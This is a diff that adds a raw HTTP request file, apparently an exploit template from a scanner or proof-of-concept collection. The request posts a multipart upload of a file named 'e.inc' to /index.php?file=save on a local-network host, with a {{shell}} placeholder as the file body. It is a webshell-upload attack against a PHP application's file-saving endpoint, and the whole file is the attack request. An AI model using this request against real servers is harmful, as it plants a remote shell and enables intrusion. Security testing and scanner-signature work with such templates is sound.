@@ -1,0 +1,24 @@
+POST /index.php?file=save HTTP/1.1
+Host: 192.168.1.130
+Proxy-Connection: keep-alive
+Content-Length: 299
+Cache-Control: max-age=0
+Origin: null
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryB5a7zPuVlnrKI26N
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.8,en;q=0.6
+
+------WebKitFormBoundaryB5a7zPuVlnrKI26N
+Content-Disposition: form-data; name="para32"; filename="e.inc"
+Content-Type: text/plain
+
+{{shell}}
+------WebKitFormBoundaryB5a7zPuVlnrKI26N
+Content-Disposition: form-data; name="submit"
+
+Submit
+------WebKitFormBoundaryB5a7zPuVlnrKI26N--
+
